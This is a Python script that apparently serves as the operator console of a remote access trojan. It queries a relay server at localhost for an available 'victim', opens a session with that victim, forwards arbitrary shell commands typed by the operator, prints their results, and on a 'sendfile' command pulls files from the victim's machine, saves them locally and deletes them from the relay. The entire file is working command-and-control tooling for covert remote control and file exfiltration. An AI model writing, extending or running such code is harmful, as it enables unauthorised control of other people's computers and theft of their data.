import requests
import time

SECRET_KEY = 'secure_password'
Victim_name = ''

url = 'http://127.0.0.1:8000/'

print('Welcome')
avaible_victim = requests.get(url=url+'getvictimstatus',data={'SECRET_KEY':SECRET_KEY})

print('\nAvailable Victim > '+str(avaible_victim.json()['Victim']))

if avaible_victim.json()['Session'] == True:
    print('Enter 1 to start creating a session, 2 to exit')
    command = input('> ')

    if command != '1':
        exit()    

    Victim_name = input('Enter vicitm name > ')
    while True:
        session_status = requests.post(url=url+'startsession',data={'SECRET_KEY':SECRET_KEY,'victim_name':Victim_name})
        print(session_status.json())
        if session_status.status_code == 200:
            break
        time.sleep(5)

print('Enter your command ',end='')
while True:
    command = input('> ')
    r = requests.post(url=url+'postcommand',data={'SECRET_KEY':SECRET_KEY,'command':command})
    if r.status_code != 200:
        print()
        print(r.json())

    if command[:4] == 'open':
        continue   
    
    elif command[:8] == 'sendfile':
        filename = command[9:]
        while True:
            result = requests.get(url=url+'getfile',data={'SECRET_KEY':SECRET_KEY,'filename':filename})
            if result.status_code == 200:
                with open('Files\\'+filename,'wb') as file:
                    file.write(result.content)
                    print(filename+' is saved succesfully')
                    time.sleep(2)
                    delete_file = requests.post(url=url+'deletefile',data={'SECRET_KEY':SECRET_KEY,'filename':filename})
                    break
            time.sleep(1)
        continue
    
    elif command == 'exit':
        exit()
    
    while True:
        result = requests.get(url=url+'getcommandresult',data={'SECRET_KEY':SECRET_KEY})
        if result.status_code == 200:
            print()
            print(result.json()['command_results'])
            break
        if result.status_code == 404 and result.json()['Problem'] == 'Session':
            print('No Session!')
            exit()
        time.sleep(1)
    print()